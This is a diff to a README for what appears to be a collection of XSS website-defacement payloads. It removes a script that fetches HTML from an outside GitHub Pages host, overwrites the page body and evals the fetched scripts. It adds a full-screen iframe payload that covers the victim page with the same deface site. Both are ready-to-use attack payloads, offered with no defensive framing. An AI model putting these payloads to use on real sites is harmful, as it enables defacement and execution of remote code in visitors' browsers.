@@ -5,19 +5,14 @@ This repository contains various XSS (Cross-Site Scripting) deface payloads that
 
 
 
-### Using with Fetch API
+### Full-Screen Iframe Injection
 
 ```html
-<script>
- fetch('https://karthikdude.github.io/Deface/')
-  .then(response => response.text()) .then(html =>
- { document.body.innerHTML = html;
- const scripts = document.body.getElementsByTagName('script');
-  for (let script of scripts) { eval(script.innerText); } });
-</script>
+<iframe src="https://karthikdude.github.io/Deface/" style="position:fixed; top:0; left:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:9999;"></iframe>
 ```
 
-**Details:** This payload fetches an external JavaScript file While this is a  secure approach, it is effective in environments where execution of external scripts is needed.
+**Details:**  
+This payload embeds a full-screen iframe pointing to `https://karthikdude.github.io/Deface/`. The styling ensures it occupies the entire viewport with the following features:
 
 ---
 
